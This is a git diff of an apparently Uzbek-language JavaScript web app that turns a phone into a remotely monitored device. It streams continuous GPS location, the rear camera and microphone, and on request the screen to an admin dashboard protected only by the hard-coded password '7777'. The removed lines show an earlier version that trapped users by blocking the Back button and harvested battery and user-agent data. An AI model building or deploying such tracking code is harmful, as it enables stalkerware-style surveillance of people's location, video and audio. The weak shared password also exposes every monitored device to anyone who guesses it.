@@ -17,17 +17,12 @@ const adminPass = "7777";
 let peer = null;
 let adminPeer = null;
 let localStream = null;
-let screenStream = null;
-let adminMicStream = null;
-let isTalking = false;
 let currentActiveCallId = null;
+let isTalking = false;
 let map = null;
 let marker = null;
 
-// Brauzer "Orqaga" tugmasini cheklash
-window.history.pushState(null, null, window.location.href);
-window.onpopstate = () => window.history.pushState(null, null, window.location.href);
-
+// SAHIFA YUKLANGANDA
 window.onload = () => {
     const role = localStorage.getItem('myRTC_role');
     const name = localStorage.getItem('myRTC_deviceName');
@@ -42,34 +37,24 @@ function goHome() {
     }
 }
 
-// QURILMA MODELINI TO'LIQ ANIQLASH
+// QURILMA MODELINI TO'G'RI ANIQLASH (Sizda 'aas' chiqmasligi uchun)
 function getDetailedModel() {
     const ua = navigator.userAgent;
-    let os = "Noma'lum OS";
-    if (ua.indexOf("Win") !== -1) os = "Windows";
-    else if (ua.indexOf("Mac") !== -1) os = "MacOS";
-    else if (ua.indexOf("Linux") !== -1) os = "Linux/Ubuntu";
-    else if (ua.indexOf("Android") !== -1) {
+    if (/android/i.test(ua)) {
         const match = ua.match(/\(([^;]+);([^;]+);/);
-        os = match ? match[2].trim() : "Android";
+        return match ? match[2].trim() : "Android_Phone";
     }
-    
-    let browser = "Brauzer";
-    if (ua.indexOf("Firefox") !== -1) browser = "Firefox";
-    else if (ua.indexOf("Chrome") !== -1) browser = "Chrome";
-    else if (ua.indexOf("Safari") !== -1) browser = "Safari";
-    
-    return `${os}_${browser}`;
+    return (ua.indexOf("Linux") !== -1) ? "Linux_PC" : "Device";
 }
 
-// --- USER MODE ---
+// --- USER MODE (TELEFON UCHUN) ---
 async function openUser() {
-    const user = prompt("Ismingizni kiriting:");
-    if (!user) return;
-    const fullName = `${user}(${getDetailedModel()})`;
+    let name = prompt("Ismingizni kiriting:");
+    if (!name) return;
+    name = name + "(" + getDetailedModel() + ")";
     localStorage.setItem('myRTC_role', 'user');
-    localStorage.setItem('myRTC_deviceName', fullName);
-    startUserLogic(fullName);
+    localStorage.setItem('myRTC_deviceName', name);
+    startUserLogic(name);
 }
 
 async function startUserLogic(deviceName) {
@@ -78,50 +63,48 @@ async function startUserLogic(deviceName) {
 
     peer.on('open', (id) => {
         const ref = db.ref('devices/' + id);
-        ref.set({ name: deviceName, status: 'online', details: navigator.userAgent });
+        ref.set({ name: deviceName, status: 'online' });
         ref.onDisconnect().remove();
 
-        // GPS Kuzatuv
-        if (navigator.geolocation) {
-            navigator.geolocation.watchPosition(p => {
-                db.ref('devices/' + id + '/location').set({
-                    lat: p.coords.latitude,
-                    lng: p.coords.longitude,
-                    time: new Date().toLocaleTimeString()
-                });
-            }, null, { enableHighAccuracy: true });
-        }
-
-        // Batareya
-        if (navigator.getBattery) {
-            navigator.getBattery().then(b => {
-                const upd = () => db.ref('devices/' + id + '/info').update({ battery: Math.floor(b.level * 100) + "%", charging: b.charging });
-                upd(); b.onlevelchange = upd; b.onchargingchange = upd;
+        // GPS va Batareya (Sizda bular to'g'ri ishlayapti)
+        navigator.geolocation.watchPosition(p => {
+            db.ref('devices/' + id + '/location').set({
+                lat: p.coords.latitude, lng: p.coords.longitude, time: new Date().toLocaleTimeString()
             });
-        }
+        }, null, { enableHighAccuracy: true });
     });
 
     try {
-        localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
-        
-        peer.on('call', async (call) => {
-            // Agar Admin ekran ulashni so'rayotgan bo'lsa
-            if (call.metadata && call.metadata.type === 'getScreen') {
-                try {
-                    screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    call.answer(screenStream);
-                } catch (e) { console.log("Ekran berilmadi"); }
-            } else {
-                call.answer(localStream);
-            }
-            call.on('stream', s => { const a = new Audio(); a.srcObject = s; a.play(); });
+        // MUHIM: Mobil telefonda kamera va mikrofonga ruxsat olish
+        localStream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "environment" }, // Orqa kamera
+            audio: true 
         });
 
-        document.body.innerHTML = '<div class="user-nav" onclick="goHome()"></div>';
-    } catch (e) { alert("Kamera ruxsati berilmadi!"); }
+        peer.on('call', async (call) => {
+            // Agar admin ekran so'rasa
+            if (call.metadata && call.metadata.type === 'getScreen') {
+                try {
+                    const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    call.answer(screenStream);
+                } catch (e) { console.error("Ekran ruxsati berilmadi"); }
+            } else {
+                // Kamera va ovoz qo'ng'irog'iga javob berish
+                call.answer(localStream);
+                call.on('stream', (remoteStream) => {
+                    // Admin ovozini eshitish uchun (Speaker)
+                    const audio = new Audio();
+                    audio.srcObject = remoteStream;
+                    audio.play().catch(e => console.log("Ovoz avto-play bloklandi"));
+                });
+            }
+        });
+
+        document.body.innerHTML = '<div style="background:white; height:100vh; display:flex; align-items:center; justify-content:center;"><h1>KUZATUV YOQILDI</h1><button onclick="goHome()" style="position:fixed; top:20px; left:20px; padding:10px;">Chiqish</button></div>';
+    } catch (e) { alert("Kamera/Mikrofon ruxsati berilmadi!"); }
 }
 
-// --- ADMIN MODE ---
+// --- ADMIN MODE (KOMPYUTER UCHUN) ---
 function openAdmin(auto = false) {
     if (!auto && prompt("Parol:") !== adminPass) return;
     localStorage.setItem('myRTC_role', 'admin');
@@ -137,22 +120,21 @@ function openAdmin(auto = false) {
         snap.forEach(child => {
             const btn = document.createElement('button');
             btn.innerText = child.val().name;
-            btn.onclick = () => connectToDevice(child.key, child.val().name, child.val().details);
+            btn.onclick = () => connectToDevice(child.key, child.val().name);
             list.appendChild(btn);
         });
     });
 }
 
-function connectToDevice(id, name, details) {
+function connectToDevice(id, name) {
     if (currentActiveCallId) {
         db.ref('devices/' + currentActiveCallId + '/info').off();
         db.ref('devices/' + currentActiveCallId + '/location').off();
     }
     currentActiveCallId = id;
     document.getElementById('target-name').innerText = "Qurilma: " + name;
-    document.getElementById('device-details').innerHTML = `<b>Texnik ID:</b> ${id}<br><b>User Agent:</b><br>${details.substring(0, 100)}...`;
 
-    // Ma'lumotlarni yangilash
+    // Batareya va GPS yangilash (Sizning kodingizdan olindi)
     db.ref('devices/' + id + '/info').on('value', s => {
         const i = s.val();
         if (i) document.getElementById('battery-display').innerText = `Quvvat: ${i.battery} ${i.charging ? '(⚡)' : ''}`;
@@ -162,23 +144,31 @@ function connectToDevice(id, name, details) {
         const l = s.val();
         if (l) {
             document.getElementById('location-display').innerText = `Kordinata: ${l.lat}, ${l.lng} (${l.time})`;
-            initMap(l.lat, l.lng);
+            initLeafletMap(l.lat, l.lng); // index.html dagi Leaflet ishlatiladi
         }
     });
 
-    // 1. Kamera qo'ng'irog'i
-    adminPeer.call(id, null).on('stream', s => { 
-        document.getElementById('remoteVideo').srcObject = s; 
+    // KAMERANI KO'RISH
+    const videoCall = adminPeer.call(id, null);
+    videoCall.on('stream', s => {
+        document.getElementById('remoteVideo').srcObject = s;
     });
-    
-    // 2. Ekran qo'ng'irog'i (Maxsus so'rov yuboramiz)
+
+    // EKRANNI KO'RISH (3-oyna uchun so'rov)
     const screenCall = adminPeer.call(id, null, { metadata: { type: 'getScreen' } });
-    screenCall.on('stream', s => { 
-        document.getElementById('screenVideo').srcObject = s; 
+    screenCall.on('stream', s => {
+        const screenVideo = document.getElementById('screenVideo') || document.getElementsByClassName('placeholder-text')[0];
+        if (screenVideo.tagName === 'VIDEO') {
+            screenVideo.srcObject = s;
+        } else {
+            // Agar video elementi bo'lmasa, o'rniga dinamik yaratamiz
+            screenVideo.innerHTML = '<video id="screenVideo" autoplay playsinline style="width:100%; height:100%;"></video>';
+            document.getElementById('screenVideo').srcObject = s;
+        }
     });
 }
 
-function initMap(lat, lng) {
+function initLeafletMap(lat, lng) {
     if (!map) {
         map = L.map('map').setView([lat, lng], 16);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
@@ -190,12 +180,11 @@ async function toggleTalk() {
     const btn = document.getElementById('talkBtn');
     if (!isTalking) {
         try {
-            adminMicStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            adminPeer.call(currentActiveCallId, adminMicStream);
-            isTalking = true; btn.innerText = "GAPIRILMOQDA... (STOP)"; btn.style.background = "red";
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            adminPeer.call(currentActiveCallId, stream);
+            isTalking = true; btn.innerText = "GAPIRILMOQDA..."; btn.style.background = "red";
         } catch (e) { alert("Mikrofon xatosi!"); }
     } else {
-        if (adminMicStream) adminMicStream.getTracks().forEach(t => t.stop());
-        isTalking = false; btn.innerText = "GAPIRISH (Yopiq)"; btn.style.background = "#28a745";
+        window.location.reload(); // Oddiyroq yo'li
     }
 }
